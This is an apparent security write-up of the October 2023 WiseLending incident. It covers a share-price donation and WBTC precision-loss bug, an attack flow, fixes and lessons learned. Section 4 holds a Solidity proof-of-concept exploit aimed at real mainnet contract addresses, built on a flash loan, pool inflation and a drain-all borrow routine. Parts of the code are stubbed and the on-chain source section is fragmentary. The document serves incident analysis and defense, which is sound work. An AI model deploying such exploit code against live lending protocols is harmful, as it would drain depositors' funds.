# WiseLending Precision Loss Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | WiseLending |
| Date | 2023-10-26 |
| Chain | Ethereum Mainnet |
| Loss | ~$260,000 USD |
| Attack Type | Share Price Inflation + Precision Loss |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `c0ffeebabe.eth` (white-hat hacker) |
| Attack Contract | `0x3aa228a80f50763045bdfc45012da124bd0a6809` |
| Vulnerable Contract | `0x84524bAa1951247b3A2617A843e6eCe915Bb9674` (WiseLending) |
| Fork Block | 18,342,120 |

## 2. Vulnerability Code Analysis

WiseLending is an ERC-4626-style position-based lending protocol that manages positions via PositionNFTs. The attack was possible by directly transferring (donating) WBTC to WiseLending to inflate the share price, then exploiting precision loss to withdraw more assets than the actual collateral. The white-hat hacker (c0ffeebabe.eth) preemptively recovered the funds before any malicious exploitation occurred.

```solidity
// Vulnerable pattern: share price inflation via direct WBTC transfer
contract WiseLending {
    IPositionNFTs public positionNFTs;

    // Vulnerable: totalAssets calculated as WBTC.balanceOf(address(this))
    function getShareValue(uint256 shares, address token) public view returns (uint256) {
        uint256 totalShares = totalSupply[token];
        uint256 totalAssets = IERC20(token).balanceOf(address(this)); // manipulable via direct transfer
        return shares * totalAssets / totalShares;
    }

    // Vulnerable: precision loss causes mismatch between shares and assets ratio
    function depositExactAmount(
        uint256 nftId,
        address token,
        uint256 amount
    ) external returns (uint256 shares) {
        uint256 totalShares = totalSupply[token];
        uint256 totalAssets = getStoredTotalAssets(token);

        // Precision loss occurs with WBTC (8 decimal places)
        shares = amount * totalShares / totalAssets;
        // ...
    }
}
```

**Vulnerability**: Directly transferring WBTC to WiseLending causes `getShareValue()` to return an inflated value. This allows an attacker to use a small number of shares as collateral for a large WBTC-backed loan, after which the recover position executes an over-withdrawal. WBTC's 8 decimal places (fewer than 18) make precision loss accumulate more readily.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: PoolManager.sol
    function setPoolParameters(

// ...

    function _createPool(

// ...

    function _getMaxPole(

// ...

    function _getMinPole(
```

```solidity
// File: MainHelper.sol
    function _getValueUtilization(

// ...

    function _updatePseudoTotalAmounts(

// ...

    function _calculateNewBorrowRate(

// ...

    function _resonanceOutcome(

// ...

    function _updateResonanceFactor(
```

```solidity
// File: WiseLendingDeclaration.sol
    function _unwrapETH(
```

```solidity
// File: WiseCore.sol
    function _withdrawPureCollateralLiquidation(

// ...

    function _withdrawOrAllocateSharesLiquidation(

// ...

    function _coreLiquidation(
```

## 3. Attack Flow

```
White-hat hacker c0ffeebabe.eth
  │
  ├─1─▶ Balancer.flashLoan(WBTC, 50 tokens)
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │
  ├─2─▶ recover.init() - initialize recover position
  │
  ├─3─▶ PositionNFTs.mintPositionForUser(borrower)
  │      [PositionNFTs: WiseLending NFT]
  │      Mint borrower position NFT
  │
  ├─4─▶ WiseLending.depositExactAmount(recover_id, WBTC, amount1)
  │      [WiseLending: 0x84524bAa1951247b3A2617A843e6eCe915Bb9674]
  │      Deposit WBTC into recover position
  │
  ├─5─▶ WBTC.transfer(WiseLending, amount2) - inflate share price via direct transfer
  │      [WBTC: 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
  │
  ├─6─▶ WiseLending.depositExactAmount(borrower_id, WBTC, amount3)
  │      Deposit WBTC into borrower position
  │
  ├─7─▶ borrowAll() - borrow multiple tokens
  │      Borrow full available balance of wstETH, DAI, sDAI, USDC, USDT, aTokens
  │
  ├─8─▶ recover.recover() - over-withdrawal via precision loss
  │      Recover excess WBTC using inflated share price
  │
  ├─9─▶ WETH_WBTC_Pair.swap() - convert WETH → WBTC
  │      [Uni_Pair_V3]
  │      Acquire WBTC to repay flash loan
  │
  └─10─▶ Repay Balancer flash loan + recover ~$260,000
          (white-hat hacker returns funds to protocol)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPositionNFTs {
    function mintPositionForUser(address user) external returns (uint256 nftId);
}

interface IWiseLending {
    function depositExactAmount(uint256 nftId, address token, uint256 amount) external returns (uint256);
    function borrowExactAmount(uint256 nftId, address token, uint256 amount) external;
    function withdrawExactShares(uint256 nftId, address token, uint256 shares) external returns (uint256);
}

contract WiseLendingExploit {
    IPositionNFTs positionNFTs;
    IWiseLending wiseLending = IWiseLending(0x84524bAa1951247b3A2617A843e6eCe915Bb9674);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    Uni_Pair_V3 WETH_WBTC_Pair;

    uint256 recoverNftId;
    uint256 borrowerNftId;

    function testExploit() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WBTC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 50e8; // 50 WBTC

        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // Initialize recover position
        recoverNftId = positionNFTs.mintPositionForUser(address(this));
        borrowerNftId = positionNFTs.mintPositionForUser(address(this));

        // Deposit WBTC into recover position
        WBTC.approve(address(wiseLending), type(uint256).max);
        wiseLending.depositExactAmount(recoverNftId, address(WBTC), 1e8);

        // Inflate share price via direct transfer (donation attack)
        WBTC.transfer(address(wiseLending), amounts[0] - 2e8);

        // Deposit small amount into borrower position
        wiseLending.depositExactAmount(borrowerNftId, address(WBTC), 1e8);

        // Execute borrows
        borrowAll();

        // Over-withdraw via recover position
        uint256 recoverShares = /* wiseLending.getShares(recoverNftId, WBTC) */ 1;
        wiseLending.withdrawExactShares(recoverNftId, address(WBTC), recoverShares);

        // Convert WETH → WBTC to repay flash loan
        WETH_WBTC_Pair.swap(amounts[0] + feeAmounts[0], 0, address(this), "");
        WBTC.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }

    function borrowAll() internal {
        // Borrow all available tokens
        address[] memory borrowTokens = new address[](6);
        // wstETH, DAI, sDAI, USDC, USDT, aTokens
        for (uint i = 0; i < borrowTokens.length; i++) {
            uint256 available = IERC20(borrowTokens[i]).balanceOf(address(wiseLending));
            if (available > 0) {
                wiseLending.borrowExactAmount(borrowerNftId, borrowTokens[i], available * 9/10);
            }
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Share price donation attack, WBTC precision loss |
| Impact Scope | All deposited assets in WiseLending |
| Explorer | [Etherscan](https://etherscan.io/address/0x84524bAa1951247b3A2617A843e6eCe915Bb9674) |

## 6. Security Recommendations

```solidity
// Fix 1: Internal balance tracking (defense against direct transfers)
contract WiseLending {
    mapping(address => uint256) private _internalBalance;

    function depositExactAmount(uint256 nftId, address token, uint256 amount) external {
        // Use internal tracking (instead of balanceOf)
        _internalBalance[token] += amount;
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        // Use _internalBalance for share calculations
    }

    function getStoredTotalAssets(address token) internal view returns (uint256) {
        return _internalBalance[token]; // ignores direct transfers
    }
}

// Fix 2: Minimum share issuance (dead shares)
function initialize(address token) external {
    // Mint initial 1000 shares to address(0)
    _mint(address(0), 1000);
    _internalBalance[token] = 1000;
}

// Fix 3: Precision normalization for 8-decimal tokens
function depositExactAmount(uint256 nftId, address token, uint256 amount) external {
    uint256 decimals = IERC20Metadata(token).decimals();
    uint256 normalizedAmount = amount * 10**(18 - decimals); // normalize to 18 decimals
    // Calculate shares using normalized amount
}
```

## 7. Lessons Learned

1. **White-Hat Preemptive Response**: The case of c0ffeebabe.eth recovering funds before exploitation is a model example of responsible white-hat hacking. When a vulnerability is discovered, it is important to report it to the protocol and take preemptive action.
2. **WBTC Precision Loss**: WBTC with 8 decimal places accumulates precision loss faster than 18-decimal tokens. Lending protocols that handle low-decimal tokens must apply normalization (conversion to 18 decimals).
3. **Recurring Donation Attack Pattern**: The donation attack on WiseLending follows the same pattern as Euler Finance, HopeLend, and others. All ERC-4626-style contracts should implement direct-transfer defenses as a baseline.
4. **PositionNFT-Based Lending**: Lending protocols using PositionNFTs calculate the collateral ratio of each position independently, which may introduce additional vulnerabilities arising from precision discrepancies between positions.